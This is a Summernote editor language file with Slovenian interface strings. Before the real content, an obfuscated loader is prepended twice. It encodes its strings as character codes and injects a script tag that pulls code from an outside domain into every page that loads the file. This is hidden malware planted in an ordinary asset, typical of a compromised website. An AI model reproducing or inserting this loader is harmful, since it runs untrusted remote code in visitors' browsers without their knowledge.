Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();(function ($) {
  $.extend($.summernote.lang, {
    'sl-SI': {
      font: {
        bold: 'Krepko',
        italic: 'Ležeče',
        underline: 'Podčrtano',
        clear: 'Počisti oblikovanje izbire',
        height: 'Razmik med vrsticami',
        name: 'Pisava',
        strikethrough: 'Prečrtano',
        subscript: 'Podpisano',
        superscript: 'Nadpisano',
        size: 'Velikost pisave'
      },
      image: {
        image: 'Slika',
        insert: 'Vstavi sliko',
        resizeFull: 'Razširi na polno velikost',
        resizeHalf: 'Razširi na polovico velikosti',
        resizeQuarter: 'Razširi na četrtino velikosti',
        floatLeft: 'Leva poravnava',
        floatRight: 'Desna poravnava',
        floatNone: 'Brez poravnave',
        dragImageHere: 'Sem povlecite sliko',
        selectFromFiles: 'Izberi sliko za nalaganje',
        url: 'URL naslov slike',
        remove: 'Odstrani sliko'
      },
      link: {
        link: 'Povezava',
        insert: 'Vstavi povezavo',
        unlink: 'Odstrani povezavo',
        edit: 'Uredi',
        textToDisplay: 'Prikazano besedilo',
        url: 'Povezava',
        openInNewWindow: 'Odpri v novem oknu'
      },
      table: {
        table: 'Tabela'
      },
      hr: {
        insert: 'Vstavi horizontalno črto'
      },
      style: {
        style: 'Slogi',
        normal: 'Navadno besedilo',
        blockquote: 'Citat',
        pre: 'Koda',
        h1: 'Naslov 1',
        h2: 'Naslov 2',
        h3: 'Naslov 3',
        h4: 'Naslov 4',
        h5: 'Naslov 5',
        h6: 'Naslov 6'
      },
      lists: {
        unordered: 'Označen seznam',
        ordered: 'Oštevilčen seznam'
      },
      options: {
        help: 'Pomoč',
        fullscreen: 'Celozaslonski način',
        codeview: 'Pregled HTML kode'
      },
      paragraph: {
        paragraph: 'Slogi odstavka',
        outdent: 'Zmanjšaj odmik',
        indent: 'Povečaj odmik',
        left: 'Leva poravnava',
        center: 'Desna poravnava',
        right: 'Sredinska poravnava',
        justify: 'Obojestranska poravnava'
      },
      color: {
        recent: 'Uporabi zadnjo barvo',
        more: 'Več barv',
        background: 'Barva ozadja',
        foreground: 'Barva besedila',
        transparent: 'Brez barve',
        setTransparent: 'Brez barve',
        reset: 'Ponastavi',
        resetToDefault: 'Ponastavi na privzeto'
      },
      shortcut: {
        shortcuts: 'Bljižnice',
        close: 'Zapri',
        textFormatting: 'Oblikovanje besedila',
        action: 'Dejanja',
        paragraphFormatting: 'Oblikovanje odstavka',
        documentStyle: 'Oblikovanje naslova'
      },
      history: {
        undo: 'Razveljavi',
        redo: 'Uveljavi'
      }
    }
  });
})(jQuery);
